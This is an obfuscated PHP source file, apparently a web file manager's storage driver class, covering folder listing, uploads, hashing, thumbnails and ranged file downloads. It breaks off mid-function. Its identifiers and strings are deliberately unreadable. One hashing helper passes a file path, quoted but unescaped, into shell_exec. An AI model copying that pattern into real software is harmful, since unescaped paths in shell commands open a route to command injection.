infoFull($ÏŞ÷½£) { return $this->info($ÏŞ÷½£); } public function infoWithChildren($¦·çÎ”À) { $×ÉàËåó =& $_SERVER[Ãìšã«™]; static $‡‘ãä•Å = array(); if (isset($‡‘ãä•Å[$¦·çÎ”À])) { return $‡‘ãä•Å[$¦·çÎ”À]; } $‡óßÇ°Ù = $this->info($¦·çÎ”À); if ($‡óßÇ°Ù && $‡óßÇ°Ù[$×ÉàËåó[33]] == $×ÉàËåó[79]) { $òí‰Á™š = array($×ÉàËåó[80] => 0, $×ÉàËåó[81] => 0, $×ÉàËåó[82] => 0); $this->infoChildren($¦·çÎ”À, $òí‰Á™š); $‡óßÇ°Ù[$×ÉàËåó[80]] = $òí‰Á™š[$×ÉàËåó[80]]; $‡óßÇ°Ù[$×ÉàËåó[83]] = array($×ÉàËåó[84] => $òí‰Á™š[$×ÉàËåó[81]], $×ÉàËåó[85] => $òí‰Á™š[$×ÉàËåó[82]]); $‡‘ãä•Å[$¦·çÎ”À] = $‡óßÇ°Ù; } return $‡óßÇ°Ù; } public function listPath($ò¹½í€, $³ùÙí‹ = false) { } public function has($â¥–Âú˜, $÷ “¯ğ = false, $Íœ‡Ÿ÷° = false) { } public function canRead($×ù…äÄ÷) { } public function canWrite($¨éœ¿Ú±) { } public function getContent($ÉÕ·‚ÛÃ) { } public function setContent($¹«Ÿè§¾, $Ÿı…Â»Ä = '') { } protected function infoChildren($ ¿ß¾©®, &$¾şí“‘ª) { $ù‹¸İßù =& $_SERVER[Ãìšã«™]; check_abort_echo(); $Îõ«Óº· = $this->listPath($ ¿ß¾©®, !0); $Îõ«Óº· = array_merge($Îõ«Óº·[$ù‹¸İßù[77]], $Îõ«Óº·[$ù‹¸İßù[76]]); foreach ($Îõ«Óº· as $Ó¨íœÉÙ) { if ($Ó¨íœÉÙ[$ù‹¸İßù[33]] == $ù‹¸İßù[79]) { $¾şí“‘ª[$ù‹¸İßù[82]]++; $ÕÕÓŸ¶› = $this->getPathInner($Ó¨íœÉÙ[$ù‹¸İßù[78]]); $this->infoChildren($ÕÕÓŸ¶›, $¾şí“‘ª); } else { $¾şí“‘ª[$ù‹¸İßù[81]]++; $¾şí“‘ª[$ù‹¸İßù[80]] += $Ó¨íœÉÙ[$ù‹¸İßù[80]]; } } } public function fileSubstr($Š°Éíá½, $ˆÉú˜¥, $ª„ ñ„•) { } public function listAll($„¼…«´”) { } public function listAllMake($æ—ØÙ‘, &$Ñ¹»ŠêÜ) { $®³ÄŸ³• =& $_SERVER[Ãìšã«™]; check_abort_echo(); $¹¾œş¤­ = $this->listPath($æ—ØÙ‘, !0); if (!$¹¾œş¤­) { return; } $ÄŠÎ±¬› = array_merge($¹¾œş¤­[$®³ÄŸ³•[77]], $¹¾œş¤­[$®³ÄŸ³•[76]]); foreach ($ÄŠÎ±¬› as $ÓÉô”ıë) { $Ì½»€Ñü = $ÓÉô”ıë[$®³ÄŸ³•[33]] == $®³ÄŸ³•[79]; $Àˆİ°éÌ = array($®³ÄŸ³•[78] => $ÓÉô”ıë[$®³ÄŸ³•[78]], $®³ÄŸ³•[79] => $Ì½»€Ñü); if (isset($ÓÉô”ıë[$®³ÄŸ³•[80]])) { $Àˆİ°éÌ[$®³ÄŸ³•[80]] = $ÓÉô”ıë[$®³ÄŸ³•[80]]; } if (isset($ÓÉô”ıë[$®³ÄŸ³•[86]])) { $Àˆİ°éÌ[$®³ÄŸ³•[86]] = $ÓÉô”ıë[$®³ÄŸ³•[86]]; } if (!$Ì½»€Ñü) { $Ñ¹»ŠêÜ[] = $Àˆİ°éÌ; continue; } $Ñ¹»ŠêÜ[] = $Àˆİ°éÌ; $Úùœ‡å = $ÓÉô”ıë[$®³ÄŸ³•[78]]; $İÖøÇ”Š = $this->pathDriver; if (substr($ÓÉô”ıë[$®³ÄŸ³•[78]], 0, strlen($İÖøÇ”Š)) == $İÖøÇ”Š) { $Úùœ‡å = substr($Úùœ‡å, strlen($İÖøÇ”Š)); } $this->listAllMake($Úùœ‡å, $Ñ¹»ŠêÜ); } } public function listAllSimple($©ı¢Ş) { $¦°áº†³ =& $_SERVER[Ãìšã«™]; $÷„Øï¿¢ = array(); $ó¡©ªÄë = $this->listAll($©ı¢Ş); $‚èÓ—Ò· = $this->getPathOuter($©ı¢Ş); foreach ($ó¡©ªÄë as $¸¹Çş€×) { $‘¼Îå„É = $¸¹Çş€×[$¦°áº†³[78]]; $¥™§“Úö = $¸¹Çş€×[$¦°áº†³[78]]; if (isset($¸¹Çş€×[$¦°áº†³[87]])) { $‘¼Îå„É = $¸¹Çş€×[$¦°áº†³[87]][$¦°áº†³[78]]; $¸¹Çş€×[$¦°áº†³[80]] = $¸¹Çş€×[$¦°áº†³[87]][$¦°áº†³[80]]; $¸¹Çş€×[$¦°áº†³[86]] = $¸¹Çş€×[$¦°áº†³[87]][$¦°áº†³[86]]; } else { $¥™§“Úö = substr($¸¹Çş€×[$¦°áº†³[78]], strlen(get_path_father($‚èÓ—Ò·))); $¥™§“Úö = $¦°áº†³[8] . ltrim($¥™§“Úö, $¦°áº†³[8]); } $ã¬û«¾™ = array($¦°áº†³[78] => $¥™§“Úö, $¦°áº†³[79] => $¸¹Çş€×[$¦°áº†³[79]]); if (isset($¸¹Çş€×[$¦°áº†³[80]]) && !$¸¹Çş€×[$¦°áº†³[79]]) { $ã¬û«¾™[$¦°áº†³[80]] = $¸¹Çş€×[$¦°áº†³[80]]; } if (isset($¸¹Çş€×[$¦°áº†³[86]])) { $ã¬û«¾™[$¦°áº†³[86]] = $¸¹Çş€×[$¦°áº†³[86]]; } if (!$¸¹Çş€×[$¦°áº†³[79]]) { $ã¬û«¾™[$¦°áº†³[88]] = $‘¼Îå„É; } $÷„Øï¿¢[] = $ã¬û«¾™; } return $÷„Øï¿¢; } public function upload($€»»óúÙ, $„Òâ¯©€, $¬ü¾€ = false, $ÑèŒÙˆô = REPEAT_REPLACE) { } public function uploadFileByID($‰´‡Îúå, $°ü“Š‚, $Ôá¼å) { } public function uploadFileByPath($µ¾­ËŠ, $Õ»µ£ê, $ÁÎ…§¨ = array()) { } public function isUploadServer() { $ÎŸÃ­ìõ =& $_SERVER[Ãìšã«™]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $ÎŸÃ­ìõ[89]) { return !0; } return $GLOBALS[$ÎŸÃ­ìõ[6]][$ÎŸÃ­ìõ[90]][$ÎŸÃ­ìõ[91]]; } public function isFileOutServer() { $Œíåô‡° =& $_SERVER[Ãìšã«™]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $Œíåô‡°[89]) { return !0; } return $GLOBALS[$Œíåô‡°[6]][$Œíåô‡°[90]][$Œíåô‡°[92]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($§öÛµ³©) { $¦ª‹¯Õğ =& $_SERVER[Ãìšã«™]; if (!$this->isCdnHost()) { return $§öÛµ³©; } return str_replace(trim(get_url_root($§öÛµ³©), $¦ª‹¯Õğ[8]), trim($this->cdnHost, $¦ª‹¯Õğ[8]), $§öÛµ³©); } public function uploadLink($¿¤–¹ÈÖ, $¤“‹›Ä¯ = 0) { $³Š›êè =& $_SERVER[Ãìšã«™]; if ($this->isUploadServer()) { return; } $Ø÷°èìí = $this->getType(); if (!in_array($Ø÷°èìí, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $¯šå×¥Ê = 1024 * 1024 * 10; $œÖßÜÊ = $¤“‹›Ä¯ <= $¯šå×¥Ê ? $³Š›êè[93] : $³Š›êè[94]; $íÊë—œË = (!$¤“‹›Ä¯ ? 1 : ceil($¤“‹›Ä¯ / pow(1024, 3))) * 3600 * 4; $â°µÀšã = $this->{$œÖßÜÊ}($¿¤–¹ÈÖ, $íÊë—œË); if ($â°µÀšã) { $â°µÀšã[$³Š›êè[95]] = $¿¤–¹ÈÖ; $â°µÀšã[$³Š›êè[96]] = $Ø÷°èìí; } return $â°µÀšã; } public function uploadFormData($Ò¹µ©ôÌ, $ƒã¢ô˜ö = 3600) { } public function multiUploadFormData($¾–şâ÷Ë, $İô³Şëé = 3600) { } public function download($’Çù¶˜ñ, $—µªÖï) { } public function ext($æ‰â´£¸) { $“Æ‡¿É  =& $_SERVER[Ãìšã«™]; if (strpos($æ‰â´£¸, $“Æ‡¿É [8]) === -1) { $çç§³äÇ = $æ‰â´£¸; } else { $çç§³äÇ = $this->pathThis($æ‰â´£¸); } $Œò“ô† = $“Æ‡¿É [12]; if (strstr($çç§³äÇ, $“Æ‡¿É [10])) { $Œò“ô† = substr($çç§³äÇ, strrpos($çç§³äÇ, $“Æ‡¿É [10]) + 1); $Œò“ô† = strtolower($Œò“ô†); } if (strlen($Œò“ô†) > 3 && preg_match($“Æ‡¿É [97], $Œò“ô†, $Äó…šÄÔ)) { $Œò“ô† = $“Æ‡¿É [12]; } return $Œò“ô†; } public function pathThis($¾Î¨ß­æ) { $ÌÁªÔ†‘ =& $_SERVER[Ãìšã«™]; $¾Î¨ß­æ = str_replace($ÌÁªÔ†‘[98], $ÌÁªÔ†‘[8], rtrim($¾Î¨ß­æ, $ÌÁªÔ†‘[8])); $ÀÉ´×È = strrpos($¾Î¨ß­æ, $ÌÁªÔ†‘[8]); if ($ÀÉ´×È === !1) { return $¾Î¨ß­æ; } return substr($¾Î¨ß­æ, $ÀÉ´×È + 1); } public function pathFather($ğá¿¾ŠŠ) { $şßÃú¨Û =& $_SERVER[Ãìšã«™]; $ğá¿¾ŠŠ = str_replace($şßÃú¨Û[98], $şßÃú¨Û[8], rtrim($ğá¿¾ŠŠ, $şßÃú¨Û[8])); $İ‹¢àö = strrpos($ğá¿¾ŠŠ, $şßÃú¨Û[8]); if ($İ‹¢àö === !1) { return $şßÃú¨Û[12]; } return substr($ğá¿¾ŠŠ, 0, $İ‹¢àö + 1); } public function hashSimple($Ì¬”Ò½) { $ö¢ì—Ì› =& $_SERVER[Ãìšã«™]; if (!$Ì¬”Ò½) { return md5($ö¢ì—Ì›[12]); } $å€„Œ¼ = $this->size($Ì¬”Ò½); $Šñ¶‚ï˜ = 200; $Ï’ó’– = 50; if ($å€„Œ¼ <= $Šñ¶‚ï˜ * $Ï’ó’–) { return $this->hashMd5($Ì¬”Ò½) . $å€„Œ¼; } $Œâ”–™Ô = intval($å€„Œ¼ / $Ï’ó’–); $ŸÓ»ÇõŠ = $ö¢ì—Ì›[12]; for ($¡®ôõà = 0; $¡®ôõà < $Ï’ó’–; $¡®ôõà++) { $ŸÓ»ÇõŠ .= $this->fileSubstr($Ì¬”Ò½, $Œâ”–™Ô * $¡®ôõà, $Šñ¶‚ï˜); } $ŸÓ»ÇõŠ .= $this->fileSubstr($Ì¬”Ò½, $å€„Œ¼ - $Šñ¶‚ï˜, $Šñ¶‚ï˜); return md5($ŸÓ»ÇõŠ) . $å€„Œ¼; } public static $md5Cache = array(); public function hashMd5($¯©õ†ş×) { if (!$¯©õ†ş×) { return md5($_SERVER[Ãìšã«™][12]); } $¯©õ†ş× = $this->iconvSystem($¯©õ†ş×); if (isset(self::$md5Cache[$¯©õ†ş×])) { return self::$md5Cache[$¯©õ†ş×]; } self::$md5Cache[$¯©õ†ş×] = $this->hashMd5Shell($¯©õ†ş×); if (!self::$md5Cache[$¯©õ†ş×]) { self::$md5Cache[$¯©õ†ş×] = @md5_file($¯©õ†ş×); } return self::$md5Cache[$¯©õ†ş×]; } private function hashMd5Shell($­ñŠœ„–) { $Ğõš¬å‹ =& $_SERVER[Ãìšã«™]; if (!$­ñŠœ„–) { return md5($Ğõš¬å‹[12]); } if (!function_exists($Ğõš¬å‹[99])) { return !1; } $â÷ú¿ôğ = array($Ğõš¬å‹[100], $Ğõš¬å‹[101]); $¢±¾ãå¤ = Cache::get($Ğõš¬å‹[102]); if (!$¢±¾ãå¤) { $ ş«óÊ = BASIC_PATH . $Ğõš¬å‹[103]; $ßºŸµ«É = md5_file($ ş«óÊ); $¢±¾ãå¤ = $Ğõš¬å‹[104]; foreach ($â÷ú¿ôğ as $Ì‘Şé‡ï) { $ÑøÂŠŒ = shell_exec($Ì‘Şé‡ï . "\40\42{$ ş«óÊ}\x22"); if ($ÑøÂŠŒ && substr(trim($ÑøÂŠŒ), 0, 32) == $ßºŸµ«É) { $¢±¾ãå¤ = $Ì‘Şé‡ï; break; } } Cache::set($Ğõš¬å‹[102], $¢±¾ãå¤, 3600); } if ($¢±¾ãå¤ == $Ğõš¬å‹[104]) { return !1; } $ÑøÂŠŒ = shell_exec($¢±¾ãå¤ . "\x20\42{$­ñŠœ„–}\42"); $ÑøÂŠŒ = str_replace($Ğõš¬å‹[105], $Ğõš¬å‹[12], $ÑøÂŠŒ); return substr($ÑøÂŠŒ, 0, 32); } public function link($äê÷î·¥) { return $äê÷î·¥; } public function fileOut($Í­•Ÿ÷, $‹£¯‹ÔÈ = false, $×Öç¾Í = false, $üÏäîçÎ = '') { $³ğµğÚü =& $_SERVER[Ãìšã«™]; $this->cacheMethod(null, null); if (!$Í­•Ÿ÷ || !$this->exist($Í­•Ÿ÷)) { show_json(LNG($³ğµğÚü[106]), !1, $×Öç¾Í); } $˜Í‚äûò = $this->getType() == $³ğµğÚü[107]; $¦Ù™öˆ = $GLOBALS[$³ğµğÚü[6]][$³ğµğÚü[90]][$³ğµğÚü[108]][$³ğµğÚü[109]]; $òñ´¸Šß = (double) $GLOBALS[$³ğµğÚü[6]][$³ğµğÚü[90]][$³ğµğÚü[108]][$³ğµğÚü[110]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $‚¦øë°» = $this->infoFull($Í­•Ÿ÷); $¢úİİá = $‚¦øë°»[$³ğµğÚü[80]]; $ÒéáÉÙ… = gmdate($³ğµğÚü[111], $‚¦øë°»[$³ğµğÚü[86]]); $‚¶ä„ıÉ = $×Öç¾Í ? $×Öç¾Í : $this->iconvApp($‚¦øë°»[$³ğµğÚü[32]]); $¸Ïèìû = 0; $©Ğ„Â³“ = $¢úİİá - 1; $ÄÏ‰­• = $this->ext($‚¶ä„ıÉ); if (in_array($ÄÏ‰­•, array($³ğµğÚü[112], $³ğµğÚü[113], $³ğµğÚü[114], $³ğµğÚü[115]))) { $ÄÏ‰­• = $³ğµğÚü[116]; } if (!$üÏäîçÎ) { $üÏäîçÎ = md5($ÒéáÉÙ… . $this->hashSimple($Í­•Ÿ÷)); } $üÏäîçÎ = $³ğµğÚü[117] . $üÏäîçÎ . $³ğµğÚü[117]; $›»…âÀ = get_file_mime($ÄÏ‰­•); if ($‹£¯‹ÔÈ === !1 && !mime_support($›»…âÀ)) { $‹£¯‹ÔÈ = !0; $›»…âÀ = $³ğµğÚü[118]; } header($³ğµğÚü[119]); header($³ğµğÚü[120] . $›»…âÀ); $Í±‹Íéû = rawurlencode($‚¶ä„ıÉ); $Í±‹Íéû = $³ğµğÚü[117] . $Í±‹Íéû . $³ğµğÚü[121] . $Í±‹Íéû; if ($‹£¯‹ÔÈ) { header($³ğµğÚü[122]); header($³ğµğÚü[123] . $Í±‹Íéû); } else { } header($³ğµğÚü[124] . gmdate($³ğµğÚü[111], time() + 3600 * 24 * 30) . $³ğµğÚü[125]); header($³ğµğÚü[126]); header($³ğµğÚü[127]); header($³ğµğÚü[128]); if (isset($_SERVER[$³ğµğÚü[129]]) && strtotime($_SERVER[$³ğµğÚü[129]]) == $‚¦øë°»[$³ğµğÚü[86]]) { header($³ğµğÚü[130], !0, 304); die; } if (isset($_SERVER[$³ğµğÚü[131]]) && $_SERVER[$³ğµğÚü[131]] == $üÏäîçÎ) { header($³ğµğÚü[132] . $üÏäîçÎ, !0, 304); die; } header($³ğµğÚü[132] . $üÏäîçÎ); header($³ğµğÚü[133] . $ÒéáÉÙ… . $³ğµğÚü[125]); header($³ğµğÚü[134] . $‚¶ä„ıÉ); header($³ğµğÚü[135]); header($³ğµğÚü[136] . $¢úİİá); header($³ğµğÚü[137]); if (!$‹£¯‹ÔÈ && $ÄÏ‰­• == $³ğµğÚü[138]) { if ($¢úİİá > 1024 * 1024 * 5) { die; } $¹‚—¬›ì = $this->getContent($Í­•Ÿ÷); $¹‚—¬›ì = Html::clearSVG($¹‚—¬›ì); header($³ğµğÚü[139] . strlen($¹‚—¬›ì)); echo $¹‚—¬›ì; die; } $˜š¶›‹Ÿ = strtolower($_SERVER[$³ğµğÚü[140]]); if ($˜Í‚äûò && $˜š¶›‹Ÿ && $¦Ù™öˆ) { if (strstr($˜š¶›‹Ÿ, $³ğµğÚü[141])) { header($³ğµğÚü[142] . $Í­•Ÿ÷); } else { if (strstr($˜š¶›‹Ÿ, $³ğµğÚü[143])) { header($³ğµğÚü[144] . $Í­•Ÿ÷); } else { if (strstr($˜š¶›‹Ÿ, $³ğµğÚü[145])) { header($³ğµğÚü[146] . $Í­•Ÿ÷); } } } if ($òñ´¸Šß) { header($³ğµğÚü[147] . $òñ´¸Šß); } return; } if (isset($_SERVER[$³ğµğÚü[148]])) { if (preg_match($³ğµğÚü[149], $_SERVER[$³ğµğÚü[148]], $€š)) { $¸Ïèìû = intval($€š[1]); if (!empty($€š[2])) { $©Ğ„Â³“ = intval($€š[2]); } } header($³ğµğÚü[150]); header("\x43\x6f\x6e\x74\145\156\x74\x2d\122\x61\156\x67\145\72\x20\142\171\164\x65\x73\40{$¸Ïèìû}\x2d{$©Ğ„Â³“}\57" . $¢úİİá); } else { header($³ğµğÚü[151]); } header($³ğµğÚü[152]); $ßÓö®ùª = !0; if ($_SERVER[$³ğµğÚü[153]] == $³ğµğÚü[154] && $¢úİİá > 1204 * 1024 * 1024 * 2) { $ßÓö®ùª = !1; } if ($ßÓö®ùª) { header($³ğµğÚü[155] . ($©Ğ„Â³“ - $¸Ïèìû + 1)); } if ($_SERVER[$³ğµğÚü[156]] == $³ğµğÚü[157]) { return; } $‰ß÷¶²ç = 1024 * 100; $ˆ°ƒö = 0; if ($òñ´¸Šß) { $ˆ°ƒö = intval(1000 * 1000 * ($‰ß÷¶²ç / $òñ´¸Šß)); } while ($¸Ïèìû <= $©Ğ„Â³“) { $Öª’İ˜ = timeFloat(); check_abort(); $°ÅÃÜÀ = $©Ğ„Â³“ - $¸Ïèìû + 1; if ($°ÅÃÜÀ <= $‰ß÷¶²ç) { $‰ß÷¶²ç = $°ÅÃÜÀ; } echo $this->fileSubstr($Í­•Ÿ÷, $¸Ïèìû, $‰ß÷¶²ç); $¸Ïèìû += $‰ß÷¶²ç; if ($‰ß÷¶²ç == $°ÅÃÜÀ) { $¸Ïèìû = $©Ğ„Â³“ + 1; } if ($ˆ°ƒö) { $àº«î€ = intval(1000 * 1000 * (timeFloat() - $Öª’İ˜)); $ßÌ€ú™Ç = $ˆ°ƒö - $àº«î€; if ($ßÌ€ú™Ç > 5) { usleep($ßÌ€ú™Ç); } } } } public function fileOutServer($Î±—¼Ç¸, $¾½ˆ±„ˆ = false, $¦Ç‡Àßğ = false, $€É«Ïƒˆ = '') { $this->fileOut($Î±—¼Ç¸, $¾½ˆ±„ˆ, $¦Ç‡Àßğ, $€É«Ïƒˆ); } public function fileOutLink($Ç¦°ˆÚ) { header($_SERVER[Ãìšã«™][158] . $Ç¦°ˆÚ); die; } public function cacheMethod($ÏÅ€³ß­, $ŠÑÑƒÕô, $İ«‹æÜ = null) { $ğŠîÅÀ =& $_SERVER[Ãìšã«™]; static $ç™ı²¤Ÿ = array(); $šî™°á = $ŠÑÑƒÕô ? ltrim($this->getPathOuter($ŠÑÑƒÕô), $ğŠîÅÀ[8]) : $ŠÑÑƒÕô; $Õğ¤Ø¸¡ = $ğŠîÅÀ[159] . $ÏÅ€³ß­ . $ğŠîÅÀ[160] . rtrim($šî™°á, $ğŠîÅÀ[8]); if (is_null($ÏÅ€³ß­)) { $ç™ı²¤Ÿ = array(); return; } if (is_null($ŠÑÑƒÕô)) { unset($ç™ı²¤Ÿ[$Õğ¤Ø¸¡]); return; } if (!is_null($İ«‹æÜ)) { $ç™ı²¤Ÿ[$Õğ¤Ø¸¡] = $İ«‹æÜ; return; } $ÏÅ»à£ = isset($ç™ı²¤Ÿ[$Õğ¤Ø¸¡]) ? $ç™ı²¤Ÿ[$Õğ¤Ø¸¡] : null; if (!is_null($ÏÅ»à£)) { return $ÏÅ»à£; } $ÏÅ»à£ = $this->{$ÏÅ€³ß­}($ŠÑÑƒÕô); $ç™ı²¤Ÿ[$Õğ¤Ø¸¡] = $ÏÅ»à£; return $ÏÅ»à£; } public function fileOutImage($Éğö‚êú, $”Ã¿‰î = 250) { $³³ö© =& $_SERVER[Ãìšã«™]; set_timeout(); if (substr($Éğö‚êú, 0, 4) == $³³ö©[145]) { $this->fileOutLink($Éğö‚êú); } $ä‰©´§ğ = $this->info($Éğö‚êú); $Áî»¡ùœ = $ä‰©´§ğ[$³³ö©[32]]; $‡üÂÂÕ = !1; if (isset($GLOBALS[$³³ö©[161]]) && $GLOBALS[$³³ö©[161]][$³³ö©[78]] == $ä‰©´§ğ[$³³ö©[78]]) { $Ä‰“›£ê = $GLOBALS[$³³ö©[161]][$³³ö©[162]]; if (!$ä‰©´§ğ[$³³ö©[163]]) { $ä‰©´§ğ[$³³ö©[163]] = $GLOBALS[$³³ö©[161]]; } if (isset($Ä‰“›£ê[$³³ö©[164]])) { if ($Ä‰“›£ê[$³³ö©[164]] <= $”Ã¿‰î && $Ä‰“›£ê[$³³ö©[165]] <= $”Ã¿‰î) { $‡üÂÂÕ = !0; } } $Áî»¡ùœ = $ä‰©´§ğ[$³³ö©[163]][$³³ö©[32]]; } if ($ä‰©´§ğ[$³³ö©[80]] <= 1024 * 50 || $‡üÂÂÕ || !function_exists($³³ö©[166]) || $ä‰©´§ğ[$³³ö©[167]] == $³³ö©[168]) { return $this->fileOut($Éğö‚êú, !1, $Áî»¡ùœ); } if (isset($ä‰©´§ğ[$³³ö©[163]][$³³ö©[169]])) { $øøû Åæ = $ä‰©´§ğ[$³³ö©[163]][$³³ö©[169]]; } else { if (isset($ä‰©´§ğ[$³³ö©[163]][$³³ö©[170]])) { $øøû Åæ = $ä‰©´§ğ[$³³ö©[163]][$³³ö©[170]]; } else { $øøû Åæ = md5("{$ä‰©´§ğ[$³³ö©[32]]}\x5f{$ä‰©´§ğ[$³³ö©[78]]}\137{$ä‰©´§ğ[$³³ö©[80]]}"); } } $Ä‚¿åŠ¥ = "{$øøû Åæ}\x5f{$”Ã¿‰î}\56\x70\x6e\147"; if (!($Ë’ïî©ı = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $³³ö©[171]))) { $í¸Û»ğ• = IO::mkdir(IO_PATH_SYSTEM_TEMP . $³³ö©[172]); } else { $í¸Û»ğ• = KodIO::make($Ë’ïî©ı); } if ($Ë’ïî©ı = IO::fileNameExist($í¸Û»ğ•, $Ä‚¿åŠ¥)) { $­êş§œº = KodIO::make($Ë’ïî©ı); return IO::fileOut($­êş§œº, !1, $Áî»¡ùœ); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $­êş§œº = DATA_THUMB . $Ä‚¿åŠ¥; del_file($­êş§œº); if (!@file_exists($­êş§œº)) { $Âãêş¼ = TEMP_FILES; if (!is_dir($Âãêş¼)) { mk_dir($Âãêş¼); } $èÄ‰‚œ™ = $Âãêş¼ . $øøû Åæ . $³³ö©[10] . $ä‰©´§ğ[$³³ö©[167]]; if (!@file_exists($èÄ‰‚œ™)) { $èÄ‰‚œ™ = $this->download($Éğö‚êú, $èÄ‰‚œ™); } ImageThumb::createThumb($èÄ‰‚œ™, $­êş§œº, $”Ã¿‰î, $”Ã¿‰î * 10); } if (!file_exists($­êş§œº) || filesize($­êş§œº) < 100) { return @file_exists($èÄ‰‚œ™) ? IO::fileOut($èÄ‰‚œ™) : $this->fileOut($Éğö‚êú); } if (!($éÉÅİ = IO::move($­êş§œº, $í¸Û»ğ•))) { return IO::fileOut($­êş§œº); } del_file($­êş§œº); IO::fileOut($éÉÅİ); } public function fileOutImageServer($…»Œêˆ§, $ÖñîµìÉ = 250) { $this->fileOutImage($…»Œêˆ§, $ÖñîµìÉ); } public function fileNameAuto($‡¬¦¬š, $È¤‘æşŞ, $í´ªÖÀŒ = REPEAT_RENAME, $ È¤ö»Ï = false) { $Î¦ËÅ =& $_SERVER[Ãìšã«™]; $“ôõ¼· = $‡¬¦¬š === $Î¦ËÅ[12] ? $È¤‘æşŞ : rtrim($‡¬¦¬š, $Î¦ËÅ[8]) . $Î¦ËÅ[8] . $È¤‘æşŞ; if ($í´ªÖÀŒ == REPEAT_REPLACE || !$this->exist($“ôõ¼·) || $ È¤ö»Ï && $í´ªÖÀŒ != REPEAT_RENAME_FOLDER) { return $È¤‘æşŞ; } if ($í´ªÖÀŒ == REPEAT_SKIP) { return !1; } $ÙÊéˆŠ½ = $Î¦ËÅ[10] . get_path_ext($È¤‘æşŞ); $ÙÊéˆŠ½ = $ÙÊéˆŠ½ == $Î¦ËÅ[10] || $ È¤ö»Ï ? $Î¦ËÅ[12] : $ÙÊéˆŠ½; $íßÎÎ‰ô = 1; $À¸“ô = substr($È¤‘æşŞ, 0, strlen($È¤‘æşŞ) - strlen($ÙÊéˆŠ½)); $ŸøÏÅ“ = $À¸“ô . "\50{$íßÎÎ‰ô}\51{$ÙÊéˆŠ½}"; while ($this->exist(rtrim($‡¬¦¬š, $Î¦ËÅ[8]) . $Î¦ËÅ[8] . $ŸøÏÅ“)) { $ŸøÏÅ“ = $À¸“ô . "\x28{$íßÎÎ‰ô}\x29{$ÙÊéˆŠ½}"; $íßÎÎ‰ô++; } return $ŸøÏÅ“; } private function fileNameAutoList($‹åãıÔ, $‚†ã½’ö, $é«£¬¾ = false) { $§®ëôÁÃ =& $_SERVER[Ãìšã«™]; $Û…®Õ— = $this->listPath($‹åãıÔ, !0); $Û…®Õ— = array_merge($Û…®Õ—[$§®ëôÁÃ[77]], $Û…®Õ—[$§®ëôÁÃ[76]]); $Ö´ø¢¦ = array_to_keyvalue($Û…®Õ—, $§®ëôÁÃ[12], $§®ëôÁÃ[32]); $Ä«›£‡ = $§®ëôÁÃ[10] . get_path_ext($‚†ã½’ö); $Ä«›£‡ = $Ä«›£‡ == $§®ëôÁÃ[10] || $é«£¬¾ ? $§®ëôÁÃ[12] : $Ä«›£‡; $Áİ¢û™´ = substr($‚†ã½’ö, 0, strlen($‚†ã½’ö) - strlen($Ä«›£‡)); $õ¬æÖÇ = $Áİ¢û™´ . "\x28\x30\51{$Ä«›£‡}"; for ($ş÷Æ™¶ğ = 1; $ş÷Æ™¶ğ <= count($Ö´ø¢¦) + 1; $ş÷Æ™¶ğ++) { $õ¬æÖÇ = $Áİ¢û™´ . "\x28{$ş÷Æ™¶ğ}\51{$Ä«›£‡}"; if (!in_array_not_case($õ¬æÖÇ, $Ö´ø¢¦)) { return $õ¬æÖÇ; } } return $õ¬æÖÇ; } public function listAllFiles($®Á°­ß, $›ïª”†©, $øÚ‹¬Ü = array()) { $ÌîİÖ‡‚ =& $_SERVER[Ãìšã«™]; if (empty($›ïª”†©)) { return array(); } $²·¶½Á = array(); $®Á°­ß = trim($®Á°­ß, $ÌîİÖ‡‚[8]); foreach ($›ïª”†© as $³Ñ¥ÚÓ—) { $äÓ°±Ö = ltrim(substr(trim($³Ñ¥ÚÓ—, $ÌîİÖ‡‚[8]), strlen($®Á°­ß)), $ÌîİÖ‡‚[8]); $²·¶½Á = array_merge($²·¶½Á, $this->slicePath($äÓ°±Ö)); } $’ÇÏàÇ = array(); foreach (array_unique($²·¶½Á) as $³Ñ¥ÚÓ—) { $ùèùì„ = array($ÌîİÖ‡‚[78] => $this->getPathOuter($ÌîİÖ‡‚[8] . $®Á°­ß . $ÌîİÖ‡‚[8] . $³Ñ¥ÚÓ—), $ÌîİÖ‡‚[79] => 1, $ÌîİÖ‡‚[80] => 0); if (substr($³Ñ¥ÚÓ—, -1) != $ÌîİÖ‡‚[8]) { $ùèùì„[$ÌîİÖ‡‚[79]] = 0; $Ø›ºòøí = $this->getPath($®Á°­ß . $ÌîİÖ‡‚[8] . $³Ñ¥ÚÓ—); $ùèùì„[$ÌîİÖ‡‚[80]] = isset($øÚ‹¬Ü[$Ø›ºòøí]) ? $øÚ‹¬Ü[$Ø›ºòøí] : $this->size($Ø›ºòøí); } $’ÇÏàÇ[] = $ùèùì„; } return $’ÇÏàÇ; } public function slicePath($×ô¾ìº) { $ú¨¾¸Æí =& $_SERVER[Ãìšã«™]; $Ÿ¡®Êöã = explode($ú¨¾¸Æí[8], trim($×ô¾ìº, $ú¨¾¸Æí[8])); $§œ‹ƒ›â = 0; do { ++$§œ‹ƒ›â; $±ÁûøÂ[] = implode($ú¨¾¸Æí[8], array_slice($Ÿ¡®Êöã, 0, $§œ‹ƒ›â)) . $ú¨¾¸Æí[8]; } while ($§œ‹ƒ›â < count($Ÿ¡®Êöã)); $±ÁûøÂ[count($Ÿ¡®Êöã) - 1] = $×ô¾ìº; return $±ÁûøÂ; } public function getHost() { $˜¾×¾º =& $_SERVER[Ãìšã«™]; $Õò¿çş‹ = parse_url(trim($this->domain, $˜¾×¾º[8])); $Ğˆ•Œ˜ = isset($Õò¿çş‹[$˜¾×¾º[173]]) ? $Õò¿çş‹[$˜¾×¾º[173]] : http_type(); $ÀõÃèõ = isset($Õò¿çş‹[$˜¾×¾º[174]]) ? $Õò¿çş‹[$˜¾×¾º[174]] : $Õò¿çş‹[$˜¾×¾º[78]]; if (isset($Õò¿çş‹[$˜¾×¾º[175]])) { $ÀõÃèõ .= $˜¾×¾º[4] . $Õò¿çş‹[$˜¾×¾º[175]]; } return $Ğˆ•Œ˜ . $˜¾×¾º[176] . $ÀõÃèõ; } public function pathEncode($òÛç¨Ğâ) { $ô¬ˆâÀ£ =& $_SERVER[Ãìšã«™]; return 